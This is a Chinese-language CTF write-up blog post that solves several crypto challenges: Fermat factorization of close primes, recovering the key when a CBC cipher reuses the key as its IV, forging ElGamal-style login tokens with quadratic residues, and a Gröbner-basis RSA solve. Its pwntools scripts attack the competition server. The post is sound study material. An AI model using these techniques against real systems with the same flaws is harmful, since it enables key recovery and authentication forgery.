<p>费马分解emmmmm我，其实春哥师傅给的链接里的算法我都要试过，但是没有看到费马分解，原来在</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922112229978.png" alt="image-20210922112229978"></p>
<p>不过费马分解也算是大整数分解较为常见的了，学习学习</p>
<p>首先对于RSA里的模数N，显然可以写成$N=pq=(\frac{p+q}{2})^2-(\frac{p-q}{2})^2$，当然别的素合数也可以这样拆解</p>
<p>如果p和q很接近，$(\frac{p-q}{2})^2$肯定很小，变换一下上面的等式<br>$$<br>(\frac{p+q}{2})^2-N=(\frac{p-q}{2})^2<br>$$<br>我们枚举$a,\ a=\frac{p+q}{2}$，可以从$\sqrt{N}$开始（我的理解是要看p和q具体差多少，$\sqrt{N}$只是幌子），如果$|N-a^2|$是完全平方数，说明我们找到了，之后就是解个方程的事</p>
<p>燃鹅，这里略有不同，正如春哥师傅的博客里写到，是<br>$$<br>|13p-17q|<br>$$<br>比较小，emmmmm有个$2^{573}$算小吗</p>
<p>先照搬照抄费马分解的<br>$$<br>(\frac{13p+17q}{2})^2-13\times 17N=(\frac{13p-17q}{2})^2<br>$$<br>把N乘以一个221，就和费马分级完全一样了，写两个脚本</p>
<p>这是一般的费马，虽然下面这个例子可以直接开方，但大致意思吧；用sage解方程有点奇怪</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line">Q = next_prime(P)</span><br><span class="line">N = P * Q</span><br><span class="line">a = iroot(N, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">        ans = solve([p * q - N, p - q - <span class="number">2</span> * x], [p, q])[<span class="number">0</span>]</span><br><span class="line">        p = <span class="built_in">abs</span>(ans[<span class="number">0</span>])</span><br><span class="line">        q = <span class="built_in">abs</span>(ans[<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(p, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>稍微改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">2537578464060405716805986209629349306801585799475566769629753550869939275098596985321844853409568013133264210149682740766024366488982429837531169509250859483526118776072099712258599263748732430570800661306460224380741403478451009927665855604092871949705081574682507168392533782265954982321389235080917435497979848348321877319477780053855288297818739223795823021264136388271573286209636548206594797813576810688640228747147522219625866870777713858310084857747151891233766790129427051420839675334815589489194938107230004427317376438129284740257550482956744843496127593401991789197386269415091390162278183972481279010769071314265529328954115911712467352483233380953386631332500882467</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">1595212140002311449986774328911538131302021292459414446518934463751924694901681197719356391632660947700772362140375795419149621042035212501260054901239960931458611414432758551692762707025705203714868544808208482382713403084945106505851948109261999900909705955010772382362799626266428855540493176898287751627555377040483120618564113186968911259319525250268854097054159722810266326281435235140862840574780793343440289233893489065111751815693510473980454574606688640074455096644717769189843656600438932454630073349737743755427817726253307163184245099133341515200474243399626081459226215410055396366269535409932990065250476999485239927630147382130648035686165068584532121265385100009</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">221</span> * N</span><br><span class="line">a = iroot(N, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = iroot(<span class="built_in">abs</span>(a ** <span class="number">2</span> - N), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">        p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        q = symbols(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">        ans = solve([<span class="number">221</span> * p * q - N, <span class="number">13</span> * p - <span class="number">17</span> * q - <span class="number">2</span> * x], [p, q])[<span class="number">0</span>]</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="built_in">abs</span>(ans[<span class="number">0</span>]))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="built_in">abs</span>(ans[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">assert</span> p * q == N // <span class="number">221</span></span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, <span class="built_in">int</span>(invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))), N // <span class="number">221</span>)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>好家伙是动态flag</p>
<h2 id="Crypto-一封信"><a href="#Crypto-一封信" class="headerlink" title="Crypto-一封信"></a>Crypto-一封信</h2><p>有点意思，之前在某次套娃中用到</p>
<blockquote>
<p>有一天，小明收到了一封名为mooncake的信，你可以帮他破解吗？</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">馃檭馃挼馃尶馃帳馃毆馃審馃悗馃馃毇馃槅鉁咅煈夝煍勷煄ゐ煈屸尐馃憫馃巺馃槏馃崕馃毇鈽傪煒€馃榾馃悩馃悕馃檭馃ぃ鈽€馃崕馃敩鈽傪煡嬸煄堭煃庰煒傪煃岎煇庰煂婐煍勷煄咅煔煂忦煈岎煄凁煍煒○煈ｐ煔煃答煔梆煢擆煏桂煒嗮煈夆劰鈴┾湁馃洨馃寜馃搨馃尶馃攧馃榾馃崒馃尶馃槑鈴煠ｐ煒傪煃庰煆庰煍勨尐馃尶鉁夆尐馃檭鈽凁煃庘槂馃毇馃崓馃槀馃槀鈱煑掟煑�</span><br></pre></td></tr></table></figure>

<p>首先有生僻字有平假名有欧元，直接搜索无果，而且会出来一堆需要web手去检查的东西；然后想到昨天的长城杯，虽然没意思，但有时候思路很重要，我觉得应该不会有个加密的结果是这样的，这可能是乱码，所以utf-8编码试了试，得到</p>
<p>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅👉🔄🎤👌⌨👑🎅😍🍎🚫☂😀😀🐘🐍🙃🤣☀🍎🔬☂🥋🎈🍎😂🍌🐎🌊🔄🎅🚫🌏👌🎃🔬😡👣🚪🍴🚰🦓🕹😆👉ℹ⏩✉🛩🌉📂🌿🔄😀🍌🌿😎⏩🤣😂🍎🏎🔄⌨🌿✉⌨🙃☃🍎☃🚫🍍😂😂⌨🗒🗒</p>
<p>emoji编码，也就是base100编码是不对滴，找到师傅的博客<a href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-10">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/#toc-heading-10</a>，说是aes emoji，需要key，结合hint中有mooncake，出</p>
<p>看到春哥师傅博客中还提到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210922161818032.png" alt="image-20210922161818032"></p>
<p>先记下</p>
<h2 id="Crypto-沐沐子倒拔垂杨柳"><a href="#Crypto-沐沐子倒拔垂杨柳" class="headerlink" title="Crypto-沐沐子倒拔垂杨柳"></a>Crypto-沐沐子倒拔垂杨柳</h2><blockquote>
<p>沐沐子相了一相，走到树前，把直掇脱了，用右手向下，把身倒缴着；却把左手拔住上截，把腰只一趁，将那株绿杨树带根拔起。</p>
</blockquote>
<blockquote>
<p>众菜鸡见了，一齐拜倒在地，只叫：”沐沐子非是凡人，正是真汉子！身体无千万斤气力，如何拔得起！”</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = AES.new(self.willow, AES.MODE_CBC, iv=self.willow)</span><br></pre></td></tr></table></figure>

<p>emmmmm</p>
<p>一时间找不到表达狂笑的表情包</p>
<p>具体请参考题目<a href="https://blog.csdn.net/m0_49109277/article/details/120199397?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163211958816780269885785%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163211958816780269885785&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-6-120199397.pc_v2_rank_blog_default&utm_term=cbc&spm=1018.2226.3001.4450">Yusa的密码学课堂—CBC第三课</a>，再次感谢尚师傅带我</p>
<hr>
<p>flag总共有三段，<code>change</code>是选择哪一段密文，<code>Shake</code>是加密，<code>Kick</code>是解密，密文明文由我们send，加密解密的key和iv都来自flag，主要的流程是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">    self.send(banner)</span><br><span class="line">    self.willow = self.select_level()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        self.send(<span class="string">&quot;1: Shake the willow&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;2: Kick the willow&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;3: Change a willow&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;4: Give up&quot;</span>)</span><br><span class="line">        choice = self.receive().decode()</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">            self.shake_willow()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">            self.kick_willow()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">            self.willow = self.select_level()</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">            self.send(<span class="string">&quot;886!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<p>想到上次吉林师傅给的题目，key和iv是相同的，只要一次解密和一次加密就可以得到一段flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line">port = <span class="number">28083</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">tip</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(tip)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(plaintext.<span class="built_in">hex</span>())</span><br><span class="line">    sh.recvline()</span><br><span class="line">    cipher = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">    c3, c4 = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(c4.<span class="built_in">hex</span>())</span><br><span class="line">    sh.recvline()</span><br><span class="line">    res = <span class="built_in">bytes</span>.fromhex(sh.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">    key = xor(res, c3)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    flag += attack(<span class="built_in">str</span>(i).encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>注意与上次那道题不同，这个pad是用库函数的，很奇怪，明明给了32位的，会给你填成48位的，但问题不大</p>
<p>flag就不贴了</p>
<h2 id="ctfshow-login（recuring）"><a href="#ctfshow-login（recuring）" class="headerlink" title="ctfshow_login（recuring）"></a>ctfshow_login（recuring）</h2><p>最关键的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_token</span>(<span class="params">username, r, s, y</span>):</span></span><br><span class="line">    u = bytes_to_long(username) &amp; MASK</span><br><span class="line">    <span class="comment"># No cheating</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([x &lt;= <span class="number">0</span> <span class="keyword">or</span> x &gt;= p - <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> (u, r, s)]):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, u, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p</span><br></pre></td></tr></table></figure>

<p>也就是要满足<br>$$<br>g^u\equiv_py^r\cdot r^s<br>$$<br>其中已知，</p>
<p>$p$<br>$g=7$<br>$y=g^x\ (mod\ p)$</p>
<p>u由我们指定，至少包含一个题目中提供的花名，r和s产生自以下函数，也就是题目提示丢失的私钥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_token</span>(<span class="params">username, x</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        u = bytes_to_long(username) &amp; MASK</span><br><span class="line">        k = randint(<span class="number">2</span>, p - <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> GCD(k, p - <span class="number">1</span>) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        r = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">        s = (u - x * r) * inverse(k, p - <span class="number">1</span>) % (p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> (r, s)</span><br></pre></td></tr></table></figure>

<p>$r=g^k\ (mod\ p)\<br>s=(u-x\cdot r)\cdot k^{-1}\ mod\ (p-1)$</p>
<p>确实，代入验证的式子就可知，如果知道正确的x生成的(r, s)，是可以使等式两边成立的；该加密系统也是基于DLP</p>
<p>fw不费，看着春哥的知乎开始复现</p>
<hr>
<p>想不到啊，没这方面的经验，要让$g^u\equiv_py^r\cdot r^s$成立，r和s都是由我们指定的，春哥师傅让$r=g^iy^j$，这样代入上式，得<br>$$<br>g^u\equiv_py^{g^iy^j}g^{si}y^{sj}<br>$$<br>显然根据欧拉定理，或者加上费马小定理，如果<br>$$<br>u\equiv_{p-1}si\<br>$$<br>那么只要满足<br>$$<br>1\equiv_{p}y^ry^{sj}<br>$$<br>就好了，但是师傅的推导我没有看明白，他说如果满足<br>$$<br>y\equiv_{p-1}sj<br>$$<br>上式就成立了，没转过弯来，太fw了；之后就可以通过计算随机数i和j，算出r和s还有u，就可以拿去伪造了</p>
<p>还有一个忘说了，u必须包含一个花名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_login</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>([mem <span class="keyword">in</span> username <span class="keyword">for</span> mem <span class="keyword">in</span> CTFSHOW_MEMBERS])</span><br></pre></td></tr></table></figure>

<p>就选<code>ZM.J@CTFshow</code>吧，放在前面，后1024就是我们真正的u吧</p>
<p>还好还有第二种思路，好强啊，二次剩余，欧拉准则，直接把你搞成1</p>
<p>前景知识可以参考<a href="https://blog.csdn.net/m0_49109277/article/details/120082896?spm=1001.2014.3001.5501">rabin攻击</a></p>
<p>回到$g^u\equiv_py^rg^s$，我一开始也想，也是比较自然的想法，每个变量之间有这样或那样的联系，看不透，既然要同余式两边相同，那直接干脆暴力全部都变1好了；比赛中也就是这么想想，并没有实现的思路</p>
<p>但春哥想到了二次剩余，也就是</p>
<ul>
<li>如果a是p的二次剩余，那么$(\frac{a}{p})=1$</li>
<li>如果a不是p的二次剩余，那么$(\frac{a}{p})=-1$</li>
</ul>
<p>当然在此之前的想法一般是让u的低1024位和r还有s等于p-1，由费马小定理易解，哒咔</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>([x &lt;= <span class="number">0</span> <span class="keyword">or</span> x &gt;= p - <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> (u, r, s)]):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>有范围限制，最大也就是p-2；所以进而想到的二次剩余</p>
<p>根据欧拉准则<br>$$<br>a^\frac{p-1}{2}\equiv_p(\frac{a}{p})<br>$$<br>$a^{p-1}\ mod\ p$太大了不行，那么我们求个二次剩余，显然也就是让$u=r=s=\frac{p-1}{2}$，结果就只能是1或则-1，emmmmm然后还是要碰下运气，非预期？</p>
<p>最后注意下输入输出吧，没注意，r和s一直send十六进制编码，我说怎么出不了，还有注意u已经是字节了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username = <span class="built_in">input</span>(<span class="string">&#x27;username (in hex): &#x27;</span>)</span><br><span class="line">username = <span class="built_in">bytes</span>.fromhex(username)</span><br><span class="line">r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;r (in hex): &#x27;</span>), <span class="number">16</span>)</span><br><span class="line">s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;s (in hex): &#x27;</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u = bytes_to_long(<span class="string">b&#x27;ZM.J@CTFshow&#x27;</span>) &lt;&lt; <span class="number">1024</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28066</span>)</span><br><span class="line">    content = sh.recvuntil(<span class="string">b&#x27;username (in hex):&#x27;</span>).decode()</span><br><span class="line">    p, y = findall(<span class="string">r&quot;\d+&quot;</span>, content)</span><br><span class="line">    p, y = <span class="built_in">int</span>(p), <span class="built_in">int</span>(y)</span><br><span class="line">    u, r, s = long_to_bytes(u + (p - <span class="number">1</span>) // <span class="number">2</span>), (p - <span class="number">1</span>) // <span class="number">2</span>, (p - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    sh.sendline(u.<span class="built_in">hex</span>())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;r (in hex):&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">hex</span>(r))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;s (in hex):&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">hex</span>(s))</span><br><span class="line">    flag = sh.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="张八炫CTFshow三结义（recuring）"><a href="#张八炫CTFshow三结义（recuring）" class="headerlink" title="张八炫CTFshow三结义（recuring）"></a>张八炫CTFshow三结义（recuring）</h2><p>emmmmm代码这么短，比赛时没来得及看，不要问为什么，烦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> zang, ba88, xuan, p, q, e</span><br><span class="line"></span><br><span class="line"><span class="comment"># F91 is my wife forever</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(e) <span class="keyword">and</span> (e &lt; <span class="number">91</span>)</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">ps = <span class="built_in">list</span>(<span class="built_in">map</span>(bytes_to_long, (zang, ba88, xuan)))</span><br><span class="line">cs = [<span class="built_in">pow</span>(i,e,N) <span class="keyword">for</span> i <span class="keyword">in</span> ps]</span><br><span class="line">s = <span class="built_in">sum</span>(ps) <span class="comment"># UNITE</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cs = <span class="subst">&#123;cs&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>知道所有的明文之和，知道所有的密文，但不知道哪个是flag；素指数e比较小，但N和c相同位数小指数攻击估计也够呛；N不知道是由什么样的p和q生成的，估计也不好分解</p>
<p>看下hint</p>
<blockquote>
<p>此题可能需要一定的算力以及耐心。</p>
</blockquote>
<blockquote>
<p>如果你觉得当前容器所给出的问题太难解出，不妨重开一个容器。</p>
</blockquote>
<p>那我觉得太难可以换道题吗（doge），如果我开了100个容器还是不会怎么办（bushi）</p>
<p>没看wp前我的思路是，就手头上有的，很容易可以想到<br>$$<br>(m_1+m_2+m_3)^e\ mod\ n<br>$$<br>关于多项式的展开如下<br>$$<br>(a_1+a_2+\cdots+a_m)^n=\sum\frac{n!}{x_1!x_2!\cdots x_m!}a_1^{x_1}a_1^{x_2}\cdots a_m^{x_m}<br>$$<br>其中$x_1+x_2+\cdots+x_m=n$，也就是所有可能加起来等于n的组合</p>
<p>哦对不起，这是求和的</p>
<p>满足条件的e有18个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = [<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>]</span><br></pre></td></tr></table></figure>

<p>不会了，直接看wp</p>
<p>emmmmm Gröbner基</p>
<p>la佬~</p>
<p>我又来逛la佬博客了</p>
<p>格罗布纳基，又是哪位天才的神作</p>
<hr>
<h3 id="Grobner基"><a href="#Grobner基" class="headerlink" title="Gröbner基"></a>Gröbner基</h3><h4 id="理想"><a href="#理想" class="headerlink" title="理想"></a>理想</h4><p><del>首先我们来谈谈理想，我的理想是要成为秧歌star</del></p>
<p>对于一个多项式集合$F=f_1,\cdots,f_k$，其生成的<strong>理想</strong>为集合元素的线性组合，la佬的latex在我这里显示有点问题，应该是这样<br>$$<br>\langle f_1,\cdots,f_k \rangle=\bigg({ \sum\limits_{i=1}^k g_if_i \vert g_1,\cdots,g_k \in K[x_1,\cdots,x_n] \bigg)}<br>$$<br>其中$R=K[x_1,\cdots,x_n]$是在域$K$上的多项式环，g是多项式环中的一个多项式，x是多项式g的系数，是属于有限域$K$上的，也就是说f的系数是多项式，而由f组成的线性组合就是理想</p>
<p>什么是多项式环，我先理解成系数在$[0,\ R]$上的多项式集合吧，那域$K$就是$Z_K^*$（反正也不懂，xjb理解一下，有清楚的师傅评论区教教我，阻止我进一步误导别人）</p>
<ul>
<li>$x_i$是数</li>
<li>$g_i$是系数为$x_i$的多项式</li>
<li>$f_i$是系数为多项式$g_i$的多项式？</li>
</ul>
<h4 id="Grobner基-1"><a href="#Grobner基-1" class="headerlink" title="Gröbner基"></a>Gröbner基</h4><p>Gröbner基就是单项式序下的多项式环$K[x_1,\cdots,x_n]$，其理想$I$满足一定条件的有限生成集$G=g_1,g_2,_\cdots,g_t$吧</p>
<img data-src="https://pica.zhimg.com/50/v2-4c36be6e98c5aeccecbe8fca58dba6dc_720w.jpg?source=1940ef5c" alt="程序员有哪些专用的聊天表情包啊……？ - 知乎"/>

<hr>
<p>算了看不懂，又浪费30分钟，直接用吧</p>
<p>已知理想求Gröbner基</p>
<p>定义三元多项式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;x, y, z&gt; = PolynomialRing(Zmod(N))</span><br></pre></td></tr></table></figure>

<p>构造理想</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">G = [x+y+z-s, x^e-cs[<span class="number">0</span>], y^e-cs[<span class="number">1</span>], z^e-cs[<span class="number">2</span>]]</span><br></pre></td></tr></table></figure>

<p>然后用sage现成的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">B = Ideal(G).groebner_basis()</span><br></pre></td></tr></table></figure>

<p>今天才知道tqdm只是个进度条而已，好看点吧。。。确实好看，好用，用法和for一样</p>
<p>问题是这个理想是怎么构造的，问了下老师，我自己的理解吧；<strong>首先有三个要求的密文，于是就设置在有限域$\mathbb{Z}^*_n$的三元变量，由已知条件，显然可以构造4个多项式值为0的多项式，他们组成了理想，用这个理想可以求出一个Gröbner基，Gröbner基就是这个理想属于的最短的那个基，如果不是满足这个基的理想是求不出来的</strong></p>
<p>求出来的Gröbner基是一元的，也就是$x+x_0,\ y+y_0,\ z+z_0$，他们都等于N</p>
<hr>
<p>唔，苦露西，代码再短也不会</p>
<p>直接跑脚本了，确实慢，到了一半我就掐掉重开，终于成功，得到</p>
<blockquote>
<p>[x +<br>26662827782051464615976567684752925677467881725332575738209359733512862160799560732998203503511148730687717124305275025073641447585135831097416975699029611753775395118044337114687461451203396381780284280332279054412946883024040851932234340654069479840307590336431065451668520879110676315718029797292361072793366910857300705975725867933068706498317130739553540485217415514125547447045647449411275827867898811663393269578679727735421639780469843184306978152618597198612892115614024042436618084049774644761224850091459122581613735095060947960942929699069451075614514322230810345965639861985343385928596524291866515457506,<br>y +<br>26662827782051464615976567684752925677467881725332575738209359733512862160799560732998203503511148730687717124305275025073641447585135831097416975699029611753775395118044337114687461451203396381780284280332279054412946883024040851932234340654069479840307590336431065451668520879110676315718029797292361072793366910857300705975725867933068706498317130739553540485217415514125547447045647449411275827867898811663393269578679727735421639780469843184306978152618597198612892115614024042436618084049774644761224850091459122581613735095060947960942929699069451075614514322230810345965639868618012628867112994837267731290388,<br>z +<br> 26662827782051464615976567684752925677467881725332575738209359733512862160799560732998203503511148730687717124305275025073641447585135831097416975699029611753775395118044337114687461451203396381780284280332279054412946883024040851932234340654069479840307590336431065451668520879110676315718029797292361072793366910857300705975725867933068706498317130739553540485217415514125547447045647449411275827867898811663393269578679727735421639780469843184306978152618597198612892115614024042436618084049774644761224850091459122581613735095060947960942929699069451075614514322230810345965509879226494955760912958428560544399675]</p>
</blockquote>
<p>然后N减去后面这个数字，转字节懂的</p>
<p>所以感觉Gröbner基可解多元方程，但又不完全是</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>Gröbner基</tag>
      </tags>
  </entry>
  <entry>
    <title>20210925 长安杯Crypto方向部分复现</title>
    <url>/posts/1f50d7b8/</url>
    <content><![CDATA[<p>又是零解的一天，凭借强悍的队友，全程只靠web晋级</p>
